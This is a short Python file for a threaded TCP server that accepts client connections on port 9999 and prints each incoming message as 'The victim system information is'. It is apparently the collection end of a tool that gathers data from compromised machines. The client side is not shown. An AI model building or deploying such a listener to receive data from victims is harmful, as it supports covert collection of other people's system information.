import socket
import threading

HOST_INFO = (socket.gethostbyname(socket.gethostname()), 9999)
BUFFER_SIZE = 64
CODING = "utf-8"
clients = []
clients_counter = 1


# This function is a client handler and is executed when a new clien t is connected to the server
def my_client_handler(input_client_info):
    connection = input_client_info[0]
    client_name = clients[len(clients) - 1][0]
    print(client_name + " connected")
    welcome_message = "Welcome, you are connected to the server"
    welcome_message += " " * (BUFFER_SIZE - len(welcome_message))
    connection.send(welcome_message.encode(CODING))
    while True:
        message_size = int(connection.recv(BUFFER_SIZE).decode(CODING))
        message = connection.recv(message_size).decode(CODING)
        print("The victim system information is: \n" + message)







# Main part of the code starts here
main_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
main_socket.bind(HOST_INFO)
main_socket.listen()
print("SERVER STARTED...")

while True:
    print("\nWaiting for clients to connect...\n")
    client_info = main_socket.accept()
    inbox = []
    temp = ["client" + str(clients_counter), client_info]
    clients_counter += 1
    clients.append(temp)
    t = threading.Thread(target=my_client_handler, args=(client_info,))
    t.start()












